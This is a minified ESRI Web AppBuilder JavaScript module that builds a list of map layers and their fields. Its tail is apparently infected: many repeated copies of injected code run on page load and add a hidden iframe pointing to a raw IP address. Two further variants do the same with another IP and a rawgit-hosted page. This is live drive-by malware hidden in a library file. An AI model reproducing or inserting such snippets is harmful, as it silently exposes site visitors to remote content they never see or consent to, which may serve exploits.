// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/Evented dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/Deferred dojo/promise/all esri/request".split(" "),function(k,l,g,f,h,m,n){return l([k],{declaredClass:"layerDetails",map:null,layers:null,layerStore:null,fieldName:null,childList:null,validFieldTypes:"esriFieldTypeInteger esriFieldTypeSmallInteger esriFieldTypeDouble esriFieldTypeSingle esriFieldTypeString esriFieldTypeDate esriFieldTypeGeometry esriFieldTypeOID esriFieldTypeBlob esriFieldTypeGlobalID esriFieldTypeRaster esriFieldTypeGUID esriFieldTypeXML".split(" "),
geometryTypes:null,layersOnly:!1,constructor:function(b){this.map=b;this.startup()},startup:function(){this.layerStore=null;this.layerStore=[]},getAllMapLayers:function(){var b=[],e=new h,d;f.forEach(this.map.itemInfo.itemData.operationalLayers,g.hitch(this,function(a){if(!a.featureCollection)if("undefined"!==typeof a.layerObject&&a.layerObject.type&&"Feature Layer"===a.layerObject.type)d={label:a.title,id:a.id,url:a.url,fieldName:this.fieldName,type:"Feature Layer",checked:!1,children:[]},b.push(this._getLayerInfo(d)),
this.layerStore.push(d);else if(a.layers){if(this.childList=[],"undefined"===typeof a.layerType||"ArcGISTiledMapServiceLayer"!==a.layerType)f.forEach(a.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:a.id+"."+c.id,url:a.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[]};this.childList.push(c);b.push(this._getLayerInfo(c))})),d={label:a.title,id:a.id,url:a.url,type:"Service",checked:!1,children:this.childList},this.layerStore.push(d)}else"ArcGISMapServiceLayer"===
a.layerType&&(this.childList=[],f.forEach(a.layerObject.layerInfos,g.hitch(this,function(c){c={label:c.name,id:a.id+"."+c.id,url:a.url+"/"+c.id,type:"Layer",fieldName:this.fieldName,checked:!1,children:[]};this.childList.push(c);b.push(this._getLayerInfo(c))})),d={label:a.title,id:a.id,url:a.url,type:"MapService",checked:!1,children:this.childList},this.layerStore.push(d))}));m(b).then(g.hitch(this,function(){var a=this._controlComplete();this.emit("complete",a);e.resolve(a)}),g.hitch(this,function(){e.resolve(null)}));
return e.promise},_getLayerInfo:function(b){var e=new h;b.url?0===b.url.length?e.resolve():n({url:b.url,content:{f:"json"},callbackParamName:"callback"}).then(g.hitch(this,function(d){if(d.hasOwnProperty("fields")&&!1===this.layersOnly){var a=f.map(d.fields,g.hitch(this,function(a){return{label:a.alias,id:b.id+"."+a.name,name:a.name,type:"Field",fieldType:a.type,checked:!1}})),a=f.filter(a,g.hitch(this,function(a){return 0<=f.indexOf(this.validFieldTypes,a.fieldType)}));b.children=a}b.geometryType=
d.geometryType;b.visible=!0;this.geometryTypes&&!f.some(this.geometryTypes,function(a){if(a===b.geometryType)return!0})&&(b.visible=!1);e.resolve(d)}),function(){e.resolve(null)}):e.resolve();return e.promise},_controlComplete:function(){f.forEach(this.layerStore,function(b){if(b.children&&0<b.children.length){var e=f.filter(b.children,function(b){return b.hasOwnProperty("visible")?b.visible:!0});b.children=e;0===b.children.length&&(b.visible=!1)}});return this.store={data:{identifier:"id",label:"label",
items:f.filter(this.layerStore,function(b){return b.hasOwnProperty("visible")?b.visible:!0})}}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});